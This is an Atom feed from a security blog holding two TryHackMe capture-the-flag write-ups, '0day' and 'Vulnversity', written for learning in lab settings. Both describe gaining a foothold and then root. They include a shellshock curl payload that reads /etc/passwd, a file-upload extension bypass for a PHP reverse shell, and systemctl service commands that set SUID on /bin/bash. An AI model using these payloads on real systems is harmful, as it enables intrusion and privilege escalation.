@@ -1,0 +1,324 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-03T11:15:37-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">miaulez.rocks</title><subtitle>Ethical Hacking, Penetration Testing, Security, CTFs and more.</subtitle><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><entry><title type="html">0day - Try Hack Me</title><link href="http://localhost:4000/thm-0day-writeup/" rel="alternate" type="text/html" title="0day - Try Hack Me" /><published>2021-05-22T00:00:00-04:00</published><updated>2021-05-22T00:00:00-04:00</updated><id>http://localhost:4000/thm-0day-writeup</id><content type="html" xml:base="http://localhost:4000/thm-0day-writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hello, and welcome to the write-up for 0day machine on TryHackMe, a medium-rated machine that involved exploiting a shellshock vulnerability, then escalating to root via a kernel exploit.&lt;/p&gt;
+
+&lt;h1 id=&quot;nmap&quot;&gt;Nmap&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Mon Sep 13 06:24:27 2021 as: nmap -sC -sV -oN nmap/0day 10.10.115.124&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.115.124
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.027s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: 0day
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Mon Sep 13 06:24:42 2021 -- 1 IP address (1 host up) scanned in 15.35 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nothing that stands up, just that the openssh is a bit outdated, but it does not have any public exploits available to aid us into gaining access to the machine&lt;/p&gt;
+
+&lt;h1 id=&quot;webserver&quot;&gt;WebServer&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing, let’s check the source code&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing as well, let’s dive into directory busting.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Gobuster quickly found some interesting directories to have look into, let’s check each one of these&lt;/p&gt;
+
+&lt;p&gt;going to /uploads we discover a blank page (but we might gobuster it)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;let’s try /admin&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And again, a blank page.&lt;/p&gt;
+
+&lt;p&gt;peeking at /backup&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This looks like a private id_rsa key, it is encrypted though, let’s try cracking it&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The password is “letmein” , let’s try the username of 0day (as we saw on the front page)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, it didn’t work. Let’s take a step back and revisit the last directory gobuster had found, which is /secret&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And.. nothing, just a photo of a turtle&lt;/p&gt;
+
+&lt;p&gt;But wait, there’s one more, and that is /cgi-bin, now, let me explain what /cgi-bin directory is. The cgi-bin is a folder for scripts found in the directories of the file manager. If we googled something like “cgi-bin vulnerabilities”, we’ll most likely stumble across a well-known vulnerability called “shellshock”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, what is shellshock? Shellshock is effectively a Remote Command Execution vulnerability in bash. The vulnerability relies in the fact that bash incorrectly executes trailing commands when it imports a function definition stored into an environment variable (source: https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)&lt;/p&gt;
+
+&lt;h1 id=&quot;understanding-the-vulnerability&quot;&gt;Understanding the vulnerability&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Googling “shellshock exploit”, quickly gives us a github page, that explains what shellshock is, and also provides an exploit for it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, having done our enumeration thoroughly and having nikto run in the background while checking the directories and all that stuff, nikto will actually tell us that there is a shellshock vulnerability on the website, let’s take a look&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;                                                                                                                 1 ⨯
+http://10.10.115.124/cgi-bin/test.cgi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We’ll use this payload&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And there we go, let’s get a shell on the box.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great, let’s stabilize the shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s get the user.txt flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Quickly after running linpeas we can see that the kernel in use might be our PE vector&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s google that up&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Viewing the post from exploit-db&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s copy and compile this exploit onto the target machine&lt;/p&gt;
+
+&lt;p&gt;However, when we try to compile the exploit, an error shows up&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s search for cc1 using find to see if cc1 is present on the system (maybe it isn’t in our path but it could be on the box)&lt;/p&gt;
+
+&lt;h1 id=&quot;rooted&quot;&gt;Rooted&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, simple as that we rooted this box. It was definitely not a tough machine, and you can learn that even tools like nikto can get you where you want to be. Hope you enjoyed reading this write-up.&lt;/p&gt;</content><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><category term="tryhackme" /><category term="infosec" /><category term="shellshock" /><category term="kernel exploit" /><category term="tryhackme" /><category term="security" /><category term="pentesting" /><category term="CVE-2014-6271" /><summary type="html">0day invloves exploiting a shellshock vulnerability for an initial foothold, then escalating to root via a kernel exploit.</summary></entry><entry><title type="html">Vulnversity - Try Hack Me</title><link href="http://localhost:4000/thm-vulnversity-writeup/" rel="alternate" type="text/html" title="Vulnversity - Try Hack Me" /><published>2021-05-22T00:00:00-04:00</published><updated>2021-05-22T00:00:00-04:00</updated><id>http://localhost:4000/thm-vulnversity-writeup</id><content type="html" xml:base="http://localhost:4000/thm-vulnversity-writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hello, today we’re doing Vulnversity from tryhackme.com , an easy machine aimed for beginners. It involved finding an upload form, then exploiting that poorly secured upload form to obtain a shell on the box. For privilege escalation we found out that there is a suid bit set on systemctl , checking gtfobins gives us a method on how to run commands as root.&lt;/p&gt;
+
+&lt;h1 id=&quot;nmap&quot;&gt;Nmap&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Mon Sep 13 22:32:58 2021 as: nmap -sC -sV -oN nmap/vulnversity 10.10.209.201&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.209.201
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+| http-vulners-regex: 
+|   /main.pl: 
+|_    cpe:/a:squid-cache:squid:3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Vuln University
+Service Info: Host: VULNUNIVERSITY&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| smb-os-discovery: 
+|   OS: Windows 6.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|   Domain name: &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
+|   FQDN: vulnuniversity
+|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-09-13T22:33:21-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-09-14T02:33:21
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Mon Sep 13 22:33:34 2021 -- 1 IP address (1 host up) scanned in 36.66 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;6 ports open, we’ll start enumerating the ftp first then as we go we’ll enumerate each port&lt;/p&gt;
+
+&lt;h1 id=&quot;ftp&quot;&gt;FTP&lt;/h1&gt;
+
+&lt;p&gt;If anonymous login was enabled, nmap would tell us that, but nmap is weird sometimes and doesn’t and I always like to check it manually anyway.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Anonymous login wasn’t enabled and no public exploits are available for that version. Moving on…&lt;/p&gt;
+
+&lt;h1 id=&quot;smb&quot;&gt;SMB&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing to see here.. Moving on&lt;/p&gt;
+
+&lt;h1 id=&quot;webserver---3333&quot;&gt;WebServer - 3333&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing on the page is clickable, most likely a static page. Checking the source code..&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, nothing.. Starting a gobuster with different extensions&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s check other things while gobuster is running.&lt;/p&gt;
+
+&lt;p&gt;Going to /robots.txt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;404, but the server is disclosing which version of apache is the webserver running on. This would definitely be a finding on a pentest :)&lt;/p&gt;
+
+&lt;p&gt;Checking what gobuster’s doing&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we get a hit on /internal , let’s check that out.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, let’s try uploading a php file&lt;/p&gt;
+
+&lt;p&gt;Trying to upload a php reverse shell from pentestmonkey&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we get “Extension not allowed” , but what if it doesn’t check for other extensions other than .php? What if we try uploading a .phtml for example? Will that do the thing?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And hey, it says “Success”, now the question is where this file has been uploaded? Let’s try /internal/shell.phtml (also starting a netcat listener in the background)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Not here, but if we remember correctly, gobuster found an images directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, we don’t see our shell here, let’s try the root directory&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Not here… Let’s take a step back and gobuster again what’s inside of /internal directory&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And hey, we get a hit right away. Let’s go to /uploads&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We’ve already started the listener in the background, let’s just click it and see if we get a shell back&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We do, I have stabilized the shell, and read user.txt :)&lt;/p&gt;
+
+&lt;p&gt;Now, we are www-data which is a service account, how can we escalate our privileges to another user or even root? I’ve tried simple things like sudo -l and finding suid binaries with find&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is one thing that really stands out, and that is systemctl, you don’t usually see that having a suid bit set, let’s check it on gtfobins.github.io , maybe we can escalate our privileges with it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, good news, let’s click on “SUID”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s try escalating our privileges with it.&lt;/p&gt;
+
+&lt;p&gt;Adjusting it a bit, this is what we’re going to run&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.service
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[Service]
+Type=oneshot
+ExecStart=/bin/sh -c &quot;id &amp;gt; /tmp/output&quot;
+[Install]
+WantedBy=multi-user.target'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s modify “ExecStart” in order to set a suid bit on /bin/bash&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;TF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;.service
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[Service]
+Type=oneshot
+ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;
+[Install]
+WantedBy=multi-user.target'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+systemctl &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+systemctl &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TF&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Let’s try this&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well, that was it, an easy box, aimed for beginners. All I do when I write these write-ups is that I want to show you guys the methodology (if beginners are reading this), my thought process and all that stuff. Hope you’ve learned something new and I’ll see you next time&lt;/p&gt;</content><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><category term="tryhackme" /><category term="infosec" /><category term="upload vulnerability" /><category term="security" /><category term="pentesting" /><category term="systemctl" /><summary type="html">Vulnversity is a beginner friendly box from TryHackMe. The initial foothold involves exploiting a poorly secured upload functionality. Privilege Escalation is done via systemctl which has suid bit set</summary></entry></feed>
